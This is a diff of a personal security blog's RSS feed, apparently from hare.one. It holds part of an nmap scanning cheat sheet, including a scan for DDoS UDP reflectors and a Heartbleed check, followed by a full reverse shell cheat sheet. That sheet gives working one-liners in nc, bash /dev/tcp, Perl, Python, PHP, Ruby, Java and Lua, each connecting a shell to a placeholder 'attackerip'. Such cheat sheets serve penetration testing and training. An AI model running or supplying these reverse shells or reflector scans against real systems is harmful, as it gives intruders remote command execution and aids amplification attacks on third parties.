+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan with a set of scripts&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV --script&lt;span style="color:#f92672">=&lt;/span>smb* 192.168.1.1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="a-scan-to-search-for-ddos-reflection-udp-services">A scan to search for DDOS reflection UDP services&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Scan for UDP DDOS reflectors&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap –sU –A –PN –n –pU:19,53,123,161 –script&lt;span style="color:#f92672">=&lt;/span>ntp-monlist,dns-recursion,snmp-sysdescr 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="http-service-information">HTTP Service Information&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Gather page titles from HTTP services&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap --script&lt;span style="color:#f92672">=&lt;/span>http-title 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Get HTTP headers of web services&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap --script&lt;span style="color:#f92672">=&lt;/span>http-headers 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Find web apps from known paths&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap --script&lt;span style="color:#f92672">=&lt;/span>http-enum 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="detect-heartbleed-ssl-vulnerability">Detect Heartbleed SSL Vulnerability&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Heartbleed Testing&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV -p &lt;span style="color:#ae81ff">443&lt;/span> --script&lt;span style="color:#f92672">=&lt;/span>ssl-heartbleed 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ip-address-information">IP Address information&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Find Information about IP address&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap --script&lt;span style="color:#f92672">=&lt;/span>asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Reverse Shell Cheat Sheet</title><link>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</link><pubDate>Tue, 30 Jun 2020 17:22:05 +0800</pubDate><guid>https://hare.one/cheatsheet/reverse-shell-cheat-sheet/</guid><description>&lt;h2 id="利用-nc-监听端口">利用 nc 监听端口&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nc -lvp &lt;span style="color:#ae81ff">2333&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nc-版本">nc 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nc -e /bin/sh attackerip &lt;span style="color:#ae81ff">2333&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> &amp;gt;/tmp/f
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nc attackerip 8888|/bin/sh|nc attackerip &lt;span style="color:#ae81ff">9999&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="bash-版本">Bash 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 0&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash -i &amp;gt;&amp;amp; /dev/tcp/attackerip/2333 &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5|&lt;span style="color:#66d9ef">while&lt;/span> read line;&lt;span style="color:#66d9ef">do&lt;/span> $line &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">5&lt;/span> 2&amp;gt;&amp;amp;1;&lt;span style="color:#66d9ef">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> &amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span> 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">196&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mknod backpipe p; nc attackerip &lt;span style="color:#ae81ff">2333&lt;/span> 0&amp;lt;backpipe | /bin/bash 1&amp;gt;backpipe 2&amp;gt;backpipe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="perl-版本">Perl 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>perl -e &lt;span style="color:#e6db74">&amp;#39;use Socket;$i=&amp;#34;attackerip&amp;#34;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="python-版本">Python 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>python -c &lt;span style="color:#e6db74">&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;attackerip&amp;#34;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="php-版本">php 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php -r &lt;span style="color:#e6db74">&amp;#39;$sock=fsockopen(&amp;#34;attackerip&amp;#34;,2333);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="ruby-版本">Ruby 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ruby -rsocket -e&lt;span style="color:#e6db74">&amp;#39;f=TCPSocket.open(&amp;#34;attackerip&amp;#34;,2333).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="java-版本">Java 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>r &lt;span style="color:#f92672">=&lt;/span> Runtime.getRuntime&lt;span style="color:#f92672">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> r.exec&lt;span style="color:#f92672">([&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;-c&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/2333;cat &amp;lt;&amp;amp;5 | while read line; do \\&lt;/span>$line&lt;span style="color:#e6db74"> 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done&amp;#34;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> as String&lt;span style="color:#f92672">[])&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p.waitFor&lt;span style="color:#f92672">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="lua-版本">Lua 版本&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>lua -e &lt;span style="color:#e6db74">&amp;#34;require(&amp;#39;socket&amp;#39;);require(&amp;#39;os&amp;#39;);t=socket.tcp();t:connect(&amp;#39;attackerip&amp;#39;,&amp;#39;2333&amp;#39;);os.execute(&amp;#39;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#39;);&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Test</title><link>https://hare.one/test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://hare.one/test/</guid><description>&lt;p>这是一个测试页面&lt;/p>
 &lt;h2 id="用于测试博客主题的修改markdown-的样式等">用于测试博客主题的修改、markdown 的样式等&lt;/h2>
 &lt;h2 id="test-1">TEST 1&lt;/h2>
 &lt;h1 id="this-is-an-h1-tag">This is an &amp;lt;h1&amp;gt; tag&lt;/h1>
@@ -957,12 +1001,12 @@ p.waitFor&lt;span style="color:#f92672">()&lt;/span>
 &lt;h2 id="test-11">TEST 11&lt;/h2>
 &lt;span class="spoiler" >This line has some spoiler text.&lt;/span>
 &lt;h2 id="test-12">TEST 12&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">Some code text
-Some code text
-Some code text
-Some code text
-Some code text
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="test-13">TEST 13&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span style="display:flex;">&lt;span>Some code text
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Some code text
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Some code text
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Some code text
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Some code text
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="test-13">TEST 13&lt;/h2>
 &lt;blockquote>
 &lt;p>Some quote text
 Some quote text
